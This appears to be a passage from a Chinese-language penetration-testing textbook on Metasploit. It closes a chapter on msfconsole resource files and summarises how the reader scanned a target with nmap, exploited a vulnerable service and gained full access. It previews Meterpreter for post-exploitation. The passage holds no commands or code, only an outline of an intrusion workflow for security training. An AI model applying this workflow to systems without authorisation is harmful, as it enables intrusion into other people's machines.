在这里，我们指定 *msfconsole* 中的资源文件，并自动运行我们指定的命令，如输出显示的 ![](img/00002.gif) 所示。

* * *

### 注意

这些只是几个简单的例子。在 第十二章 中，你将学习如何使用一个非常大的资源文件 *karma*。

* * *

## 总结

你刚刚攻破了你的第一台机器，并使用 *msfconsole* 获得了完全访问权限。恭喜你！

我们在本章的开始部分介绍了利用的基本知识和基于发现的漏洞对目标进行攻破。利用是关于识别系统的潜在漏洞并利用其弱点。我们使用了 *nmap* 来识别可能存在漏洞的服务。从那里我们启动了一个利用程序，从而获得了对系统的访问权限。

在下一章中，我们将更详细地探讨 Meterpreter，同时学习如何在后利用阶段使用它。一旦你攻破了系统，你会发现 Meterpreter 是一个令人惊叹的工具。
